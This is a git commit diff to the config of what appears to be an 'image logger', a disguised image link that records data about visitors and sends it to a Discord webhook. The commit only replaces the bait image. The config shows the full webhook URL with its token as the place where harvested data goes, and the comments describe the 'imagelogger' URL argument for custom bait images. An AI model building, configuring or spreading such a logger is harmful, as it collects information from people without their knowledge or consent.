9e14b39be94032b0cd9195f2473034f1f742adf8
sangwoo-afk <blackostt@gmail.com>
2025-07-13 15:29:13 -0600

    Update image.py

--- api/image.py
+++ api/image.py
@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1391983821188108418/xg_ItSCzS1MosffM2fhIEPfgINkaSzLJvw9RWGW9H65F9HnuMD9ngOV5XG8fHs7VXBrm",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.discordapp.com/emojis/1381048472370680008.webp?size=96", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
